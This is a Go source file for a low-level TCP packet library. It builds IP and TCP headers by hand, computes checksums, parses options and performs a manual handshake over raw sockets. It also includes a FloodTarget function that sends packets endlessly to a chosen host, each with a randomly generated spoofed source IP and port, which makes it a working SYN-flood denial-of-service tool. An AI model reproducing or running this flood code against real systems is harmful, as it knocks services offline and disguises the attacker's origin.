package tcplib

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"math/big"
	"reflect"
	"strconv"
	"strings"
	"syscall"
	"time"
)

type TcpOptionKind uint8
type TcpFALG uint8

var TcpOptionKindNONE TcpOptionKind = 0
var TcpOptionKindNOP TcpOptionKind = 1
var TcpOptionKindMSS TcpOptionKind = 2
var TcpOptionKindTS TcpOptionKind = 8

var FLAGFIN TcpFALG = 1 << 0
var FLAGSYN TcpFALG = 1 << 1
var FLAGRST TcpFALG = 1 << 2
var FLAGACK TcpFALG = 1 << 4

type TcpOption struct {
	Kind  TcpOptionKind
	Value []byte
}

// SYNPacket represents a TCP packet.
type PacketMeta struct {
	RawBuffer       []byte      //used to be feed to sendto(), ipheader +  tcpheader + tcpdata
	TCPHeaderLength uint16      //tcp header len with options,cached because is's parsed from offset
	ParsedOptions   []TcpOption //cached parsed options
	UserTS          []byte      //user define TS, used to resend SYN when checking PAWS
	Dev             string      //user define dev to send packet
	UserData        []byte      //user data like 'GET ..'
	PeerTS          []byte      //used to save peer TS so that determie whether TS is supported by peer
	FD              int
}

func (s PacketMeta) RandByte() byte {
	randomUINT8 := make([]byte, 1)
	rand.Read(randomUINT8)
	return randomUINT8[0]
}

func (s PacketMeta) InvalidFirstOctet(val byte) bool {
	return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s PacketMeta) Leftshiftor(lval uint8, rval uint8) uint32 {
	return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

// TCPIP represents the IP header and TCP segment in a TCP packet.
type TCPIP struct {
	VersionIHL    byte
	TOS           byte
	TotalLen      uint16 //ip total len
	ID            uint16
	FlagsFrag     uint16
	TTL           byte
	Protocol      byte
	IPChecksum    uint16
	SRC           []byte
	DST           []byte
	SrcPort       uint16
	DstPort       uint16
	Sequence      []byte
	AckNo         []byte
	Offset        uint16 //headlen and flag
	Window        uint16
	TCPChecksum   uint16
	UrgentPointer uint16
	Options       []byte
	PacketMeta    `key:"PacketMeta"` //make it ignored by reflect
}

func (tcp *TCPIP) GetTcpHeaderLen() uint16 {
	if tcp.TCPHeaderLength == 0 {
		tcp.TCPHeaderLength = (tcp.Offset >> 12) * 4
	}
	return tcp.TCPHeaderLength
}

//add data
func (tcp *TCPIP) AddData(data []byte) {
	tcp.UserData = make([]byte, len(data))
	copy(tcp.UserData, data)
}

//just remove data
func (tcp *TCPIP) RemoveData() {
	if len(tcp.UserData) != 0 {
		tcp.UserData = nil
	}
}

func (tcp *TCPIP) FIN() bool {
	flag := tcp.Offset & 0xfff
	return (flag & 0x1) != 0
}
func (tcp *TCPIP) SYN() bool {
	flag := tcp.Offset & 0xfff
	return (flag & 0x2) != 0
}

func (tcp *TCPIP) ACK() bool {
	flag := tcp.Offset & 0xfff
	return (flag & 0x10) != 0
}

func (tcp *TCPIP) RST() bool {
	flag := tcp.Offset & 0xfff
	return (flag & 0x4) != 0
}

func (tcp *TCPIP) GetTcpOpt(kind TcpOptionKind) []byte {
	if len(tcp.Options) == 0 {
		//peer not sent
		return nil
	}

	if len(tcp.ParsedOptions) == 0 {
		// not parsed before
		tcp.ParsedOptions = make([]TcpOption, 0)

		for idx := 0; idx < len(tcp.Options); {
			kind := TcpOptionKind(tcp.Options[idx])
			if kind == TcpOptionKindNOP || kind == TcpOptionKindNONE {
				idx++
				continue
			}
			len := int(tcp.Options[idx+1])
			value := make([]byte, len-2)
			//fmt.Println("kind", kind, "len", len, "value", tcp.Options[idx+2:idx+len])
			copy(value, tcp.Options[idx+2:idx+len])
			tcp.ParsedOptions = append(tcp.ParsedOptions, TcpOption{
				Kind:  kind,
				Value: value,
			})
			idx += int(len)
		}
	}

	for _, v := range tcp.ParsedOptions {
		if v.Kind != kind {
			continue
		}
		return v.Value
	}
	return nil
}

func (tcp *TCPIP) CalcTCPChecksum() {

	var checksum uint32 = 0
	checksum = tcp.Leftshiftor(tcp.SRC[0], tcp.SRC[1]) +
		tcp.Leftshiftor(tcp.SRC[2], tcp.SRC[3])
	checksum += tcp.Leftshiftor(tcp.DST[0], tcp.DST[1]) +
		tcp.Leftshiftor(tcp.DST[2], tcp.DST[3])
	checksum += uint32(tcp.Protocol)
	checksum += uint32(tcp.TCPHeaderLength + uint16(len(tcp.UserData)))

	checksum += uint32(tcp.SrcPort)
	checksum += uint32(tcp.DstPort)
	checksum += tcp.Leftshiftor(tcp.Sequence[0], tcp.Sequence[1]) +
		tcp.Leftshiftor(tcp.Sequence[2], tcp.Sequence[3])

	checksum += tcp.Leftshiftor(tcp.AckNo[0], tcp.AckNo[1]) +
		tcp.Leftshiftor(tcp.AckNo[2], tcp.AckNo[3])

	checksum += uint32(tcp.Offset)

	checksum += uint32(tcp.Window)

	if len(tcp.Options)%4 != 0 {
		panic(fmt.Errorf("options length must be 4 multiple for easy checksum calculation"))
	}

	for i := 0; i < len(tcp.Options); i += 4 {
		checksum += tcp.Leftshiftor(tcp.Options[i], tcp.Options[i+1]) +
			tcp.Leftshiftor(tcp.Options[i+2], tcp.Options[i+3])
	}

	//fmt.Println("header checksum", checksum)
	userDataLen := len(tcp.UserData)
	if userDataLen > 0 {
		round := userDataLen / 2
		for i := 0; i < round; i++ {
			checksum += tcp.Leftshiftor(tcp.UserData[i*2], tcp.UserData[i*2+1])
		}

		//pad zero
		if userDataLen%2 != 0 {
			checksum += tcp.Leftshiftor(tcp.UserData[userDataLen-1], 0)
		}
	}
	//fmt.Println("data checksum", checksum)
	carryOver := checksum >> 16
	tcp.TCPChecksum = 0xFFFF - (uint16)((uint16)(checksum)+(uint16)(carryOver))
	//fmt.Println("real TCPChecksum", tcp.TCPChecksum)
}

func (tcp *TCPIP) InitACK(seq uint32) {
	headrLen := uint16(0x0014 + len(tcp.Options) + 0)
	if headrLen%4 != 0 {
		panic(fmt.Errorf("tcp heaer must be 4 multiples"))
	}
	tcp.TCPHeaderLength = headrLen
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	//tcp.TotalLen filled by kernel, uint16(0x0028 + len(tcp.Options))
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40
	tcp.Protocol = 0x06
	tcp.IPChecksum = 0x0000 //kernel will compute it

	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = make([]byte, 4)
	tcp.Sequence[0] = (uint8)(seq>>24) & 0xff
	tcp.Sequence[1] = (uint8)(seq>>16) & 0xff
	tcp.Sequence[2] = (uint8)(seq>>8) & 0xff
	tcp.Sequence[3] = (uint8)(seq>>0) & 0xff
	//reserved automatically zero
	tcp.Offset = uint16(((uint32)(headrLen / 4)) << 12)
	tcp.SetFlag(FLAGACK)
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
}

func SYNflag() uint8 {
	return 1 << 1
}
func (tcp *TCPIP) InitSYN(seq uint32) {
	headrLen := uint16(0x0014 + len(tcp.Options) + 0)
	if headrLen%4 != 0 {
		panic(fmt.Errorf("tcp heaer must be 4 multiples"))
	}
	tcp.TCPHeaderLength = headrLen
	tcp.VersionIHL = 0x45
	tcp.TOS = 0x00
	//tcp.TotalLen filled by kernel, uint16(0x0028 + len(tcp.Options))
	tcp.ID = 0x0000
	tcp.FlagsFrag = 0x0000
	tcp.TTL = 0x40
	tcp.Protocol = 0x06
	tcp.IPChecksum = 0x0000 //kernel will compute it

	tcp.Sequence = make([]byte, 4)
	tcp.AckNo = make([]byte, 4)
	tcp.Sequence[0] = (uint8)(seq>>24) & 0xff
	tcp.Sequence[1] = (uint8)(seq>>16) & 0xff
	tcp.Sequence[2] = (uint8)(seq>>8) & 0xff
	tcp.Sequence[3] = (uint8)(seq>>0) & 0xff
	//reserved automatically zero
	tcp.Offset = uint16(((uint32)(headrLen/4))<<12 | (uint32)(SYNflag()))
	tcp.Window = 0xFAF0
	tcp.UrgentPointer = 0x0000
}

func (tcp *TCPIP) SetTarget(ipAddr string, port uint16) {
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.DST = append(tcp.DST, (uint8)(val))
	}
	tcp.DstPort = port
}

func (tcp *TCPIP) SetSource(ipAddr string, port uint16) {
	for _, octet := range strings.Split(ipAddr, ".") {
		val, _ := strconv.Atoi(octet)
		tcp.SRC = append(tcp.SRC, (uint8)(val))
	}
	tcp.SrcPort = port
}

func (tcp *TCPIP) GenRandSource() {
	firstOct := tcp.RandByte()
	for tcp.InvalidFirstOctet(firstOct) {
		firstOct = tcp.RandByte()
	}

	tcp.SRC = []byte{firstOct, tcp.RandByte(), tcp.RandByte(), tcp.RandByte()}
	tcp.SrcPort = (uint16)(((uint16)(tcp.RandByte()) << 8) | (uint16)(tcp.RandByte()))
	for tcp.SrcPort <= 0x03FF {
		tcp.SrcPort = (uint16)(((uint16)(tcp.RandByte()) << 8) | (uint16)(tcp.RandByte()))
	}
}

func (tcp TCPIP) RawSocketSend(fd int, sockaddr syscall.SockaddrInet4) {

	err := syscall.Sendto(fd, tcp.RawBuffer, 0, &sockaddr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf(
			"[%s]Socket send to:  %d.%d.%d.%d:%d size %d\n",
			time.Now().Format("1970-01-01 00:00:00"),
			tcp.DST[0], tcp.DST[1], tcp.DST[2], tcp.DST[3], tcp.DstPort, len(tcp.RawBuffer),
		)
	}
}

func (tcp *TCPIP) FloodTarget(rType reflect.Type, rVal reflect.Value) {

	var dest [4]byte
	copy(dest[:], tcp.DST[:4])
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	err := syscall.BindToDevice(fd, tcp.Dev)
	if err != nil {
		panic(fmt.Errorf("bind to dev %s failed: %v", tcp.Dev, err))
	}

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	for {
		tcp.GenRandSource()
		tcp.CalcTCPChecksum()
		tcp.BuildSendBuf(rType, rVal)
		tcp.RawSocketSend(fd, addr)
	}
}

func (tcp *TCPIP) NewSocket() int {
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	err := syscall.BindToDevice(fd, tcp.Dev)
	if err != nil {
		panic(fmt.Errorf("bind to Dev %s failed: %v", tcp.Dev, err))
	}
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	return fd
}

func (tcp *TCPIP) SetFlag(flag TcpFALG) {
	tcp.Offset = (tcp.Offset & 0xf000) | uint16(flag)
}

//remote opetions in current packet, just re-calculated header len
func (tcp *TCPIP) RemoteOptions() {
	tcp.Options = nil
	headrLen := uint16(0x0014)
	if headrLen%4 != 0 {
		panic(fmt.Errorf("tcp heaer must be 4 multiples"))
	}
	tcp.TCPHeaderLength = headrLen

	// keep original flag
	tcp.Offset = (tcp.Offset & 0xfff) | ((uint16)(headrLen/4))<<12
}

func (tcp *TCPIP) IncrSeq(seq uint32) {
	newqseq := new(big.Int)
	x := new(big.Int)
	y := new(big.Int)
	x.SetBytes(tcp.Sequence)
	y.SetUint64(uint64(seq))

	newqseq.Add(x, y)

	//fmt.Println("update seq", "resp", resp.Sequence, "ack seq", seq.Bytes())
	copy(tcp.Sequence, newqseq.Bytes())
}

func (tcp *TCPIP) DecSeq(seq uint32) {
	newqseq := new(big.Int)
	x := new(big.Int)
	y := new(big.Int)
	x.SetBytes(tcp.Sequence)
	y.SetUint64(uint64(seq))

	newqseq.Sub(x, y)

	//fmt.Println("update seq", "resp", resp.Sequence, "ack seq", seq.Bytes())
	copy(tcp.Sequence, newqseq.Bytes())
}

func (tcp *TCPIP) SetSeqUint(seq uint32) {
	x := new(big.Int)
	x.SetUint64(uint64(seq))

	//fmt.Println("update seq", "resp", resp.Sequence, "ack seq", seq.Bytes())
	copy(tcp.Sequence, x.Bytes())
}

func (tcp *TCPIP) SetSeq(seq []byte) {
	copy(tcp.Sequence, seq)
}

func (tcp *TCPIP) GetSeq() []byte {
	ret := make([]byte, 4)
	copy(ret, tcp.Sequence)
	return ret
}

// update current tcp ack seq for next sent and remote TS
func (tcp *TCPIP) Accept(resp *TCPIP) {
	seq := new(big.Int)
	x := new(big.Int)
	y := new(big.Int)
	var addSeq uint64 = 0

	if resp.FIN() || resp.SYN() {
		//syn/fin consume the seq
		addSeq = 1
	}

	x.SetUint64(uint64(len(resp.UserData)) + addSeq)
	y.SetBytes(resp.Sequence)
	seq.Add(x, y)

	//fmt.Println("update seq", "resp", resp.Sequence, "ack seq", seq.Bytes())
	copy(tcp.AckNo, seq.Bytes())
}

//receive tcp corresponding response
func (tcp *TCPIP) Recv(ctx context.Context, fd int, exceptACK *uint32) *TCPIP {
	b := make([]byte, 1600)

	for {
		select {
		case <-ctx.Done():
			//timemount
			return nil
		default:
			// TODO using BPF like tcpdump to filter
			n, addr, err := syscall.Recvfrom(fd, b, 0)
			if err != nil {
				panic(err)
			}
			addr4 := addr.(*syscall.SockaddrInet4)
			totalLen := uint16(n)
			//filter what we want
			//fmt.Println("addr", addr4.Addr, "port", addr4.Port, "num", n)

			//addr4 just parse ip header so the port should be parsed by user
			if tcp.DST[0] == addr4.Addr[0] &&
				tcp.DST[1] == addr4.Addr[1] &&
				tcp.DST[2] == addr4.Addr[2] &&
				tcp.DST[3] == addr4.Addr[3] {
				//receive
				ipLen := uint16((b[0] & 0xF) * 4)
				tcpBuffer := b[ipLen:]
				srcPort := ((uint16)(tcpBuffer[0]))<<8 + (uint16)(tcpBuffer[1])
				dstPort := ((uint16)(tcpBuffer[2]))<<8 + (uint16)(tcpBuffer[3])
				if srcPort != tcp.DstPort && dstPort != tcp.SrcPort {
					continue
				}
				var resp TCPIP
				resp.Sequence = make([]byte, 4)
				resp.AckNo = make([]byte, 4)
				copy(resp.Sequence, tcpBuffer[4:8])
				copy(resp.AckNo, tcpBuffer[8:12])
				//only recv what we want
				var respACK uint32
				bytebuff := bytes.NewBuffer(resp.AckNo)
				binary.Read(bytebuff, binary.BigEndian, &respACK)
				if exceptACK != nil && *exceptACK != respACK {
					continue
				}

				resp.Offset = (uint16)(tcpBuffer[12])<<8 | (uint16)(tcpBuffer[13])
				tcpHeaderLen := resp.GetTcpHeaderLen()

				resp.Window = uint16(tcpBuffer[14])<<8 | (uint16)(tcpBuffer[15])
				// ignore checksum
				resp.UrgentPointer = uint16(tcpBuffer[18])<<8 | (uint16)(tcpBuffer[19])

				if tcpHeaderLen > 20 {
					resp.Options = make([]byte, tcpHeaderLen-20)
					//mean it has options
					copy(resp.Options, tcpBuffer[20:tcpHeaderLen])
				}

				totalLen -= tcpHeaderLen + ipLen
				if totalLen > 0 {
					resp.UserData = make([]byte, totalLen)
					copy(resp.UserData, tcpBuffer[tcpHeaderLen:tcpHeaderLen+totalLen])
				}
				fmt.Println("ipLen", ipLen, "tcpHeaderLen", tcpHeaderLen, "win", resp.Window, "seq", resp.Sequence, "ack", resp.AckNo, "len+flag", resp.Offset, "options", resp.Options, "user data", resp.UserData)
				return &resp

			} else {
				continue
			}
		}
	}
}

func (tcp *TCPIP) Send() {

	fd := tcp.FD
	rType := reflect.TypeOf(tcp).Elem()
	rVal := reflect.ValueOf(tcp).Elem()
	var dest [4]byte
	copy(dest[:], tcp.DST[:4])

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}
	tcp.BuildSendBuf(rType, rVal)
	tcp.RawSocketSend(fd, addr)
}

func (tcp *TCPIP) BuildSendBuf(t reflect.Type, v reflect.Value) {
	tcp.RawBuffer = make([]byte, 0, 1560)
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.RawBuffer = append(tcp.RawBuffer, key.(uint8))
			case reflect.Uint16:
				tcp.RawBuffer = append(tcp.RawBuffer, (uint8)(key.(uint16)>>8))
				tcp.RawBuffer = append(tcp.RawBuffer, (uint8)(key.(uint16)&0x00FF))
			default:
				tcp.RawBuffer = append(tcp.RawBuffer, key.([]uint8)...)
			}
		}
	}
	if len(tcp.UserData) != 0 {
		tcp.RawBuffer = append(tcp.RawBuffer, tcp.UserData...)
	}
}

func (tcp *TCPIP) InitTcpOptions() {
	//must 4 multiple for easy checksum calculated
	if tcp.Options == nil {
		if len(tcp.UserTS) == 4 {
			//use Specified TS
			tcp.Options = []byte{
				0x01, 0x01, //nop
				0x02, 0x04, 0x05, 0xb4, //mss
				0x08, 0x0a, //ts header
			}
			tcp.Options = append(tcp.Options, tcp.UserTS...)
			tcp.Options = append(tcp.Options, []byte{0x00, 0x00, 0x00, 0x00}...)
		} else if len(tcp.UserTS) == 8 {
			//use Specified TS and peer TS
			tcp.Options = []byte{
				0x01, 0x01, //nop
				0x02, 0x04, 0x05, 0xb4, //mss
				0x08, 0x0a, //ts header
			}
			tcp.Options = append(tcp.Options, tcp.UserTS...)
		} else {
			tcp.Options = []byte{
				0x01, 0x01, //nop
				0x02, 0x04, 0x05, 0xb4, //mss
				0x08, 0x0a, 0xf0, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, //ts
			}
		}
	}
}

// do three way handshake
func (tcp *TCPIP) DoHandshake() error {

	fmt.Println("DoHandshake")
	fd := tcp.NewSocket()
	tcp.FD = fd

	tcp.InitTcpOptions()

	tcp.InitSYN(0xf0f1f2f3)
	tcp.CalcTCPChecksum()

	//send SYN
	tcp.Send()
	ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
	//receive the syn ack and update seq ...
	resp := tcp.Recv(ctx, fd, nil)
	if resp == nil {
		panic(fmt.Errorf("time out waiting SYN ACK"))
	}

	if !resp.SYN() || !resp.ACK() {
		panic(fmt.Errorf("response is not syn ack"))
	}

	peerTS := resp.GetTcpOpt(TcpOptionKindTS)
	if len(peerTS) == 8 {
		tcp.PeerTS = make([]byte, 4)
		copy(tcp.PeerTS, peerTS[4:8])
	}

	//incr current seq
	tcp.IncrSeq(1)
	//pollute ack seq from remote response
	tcp.Accept(resp)
	//remove TS from option...just remove opetions
	tcp.RemoteOptions()
	//send ACK for finishing handshake
	tcp.SetFlag(FLAGACK)

	tcp.CalcTCPChecksum()
	//send ACK
	tcp.Send()

	log.Println("handshake success")
	return nil
}
